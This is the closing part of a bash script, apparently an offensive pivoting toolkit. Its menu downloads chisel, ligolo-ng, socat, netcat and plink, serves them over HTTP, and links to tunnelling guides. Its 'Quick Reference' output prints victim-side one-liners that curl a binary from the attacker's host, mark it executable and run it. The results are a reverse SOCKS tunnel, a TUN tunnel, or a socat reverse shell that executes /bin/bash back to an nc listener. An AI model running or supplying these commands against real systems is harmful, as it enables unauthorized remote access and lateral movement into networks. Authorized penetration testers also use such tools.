    case $CHOICE in
        1)
            download_chisel
            show_chisel
            start_server
            ;;
        2)
            download_ligolo
            show_ligolo
            start_server
            ;;
        3)
            download_socat
            show_socat
            start_server
            ;;
        4)
            download_netcat
            show_netcat
            start_server
            ;;
        5)
            download_plink
            show_plink
            start_server
            ;;
        6)
            download_chisel
            download_ligolo
            download_socat
            download_netcat
            download_plink
            
            print_section "ALL TOOLS READY"
            echo ""
            echo "Quick Reference:"
            echo ""
            echo "CHISEL (SOCKS):"
            log_cmd "# Attacker: chisel server -p $CHISEL_PORT --reverse"
            log_cmd "# Victim:   curl http://$IP:$HTTP_PORT/chisel_linux -o /tmp/c && chmod +x /tmp/c && /tmp/c client $IP:$CHISEL_PORT R:socks"
            echo ""
            echo "LIGOLO (TUN):"
            log_cmd "# Attacker: sudo ip tuntap add user \$(whoami) mode tun ligolo && sudo ip link set ligolo up"
            log_cmd "# Attacker: ligolo-ng -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
            log_cmd "# Victim:   curl http://$IP:$HTTP_PORT/ligolo_linux -o /tmp/a && chmod +x /tmp/a && /tmp/a -connect $IP:$LIGOLO_PORT -ignore-cert"
            echo ""
            echo "SOCAT/NC (Shells):"
            log_cmd "# Attacker: nc -lvnp $CALLBACK_PORT"
            log_cmd "# Victim:   curl http://$IP:$HTTP_PORT/socat_linux -o /tmp/s && chmod +x /tmp/s && /tmp/s TCP:$IP:$CALLBACK_PORT EXEC:/bin/bash"
            
            start_server
            ;;
        7) show_ssh_guide ;;
        8) show_netsh_guide ;;
        9) show_dns_guide ;;
        10) show_icmp_guide ;;
        11) show_socksoverrdp_guide ;;
        0) log_info "Exiting"; exit 0 ;;
        *) log_error "Invalid choice"; exit 1 ;;
    esac
}

main "$@"
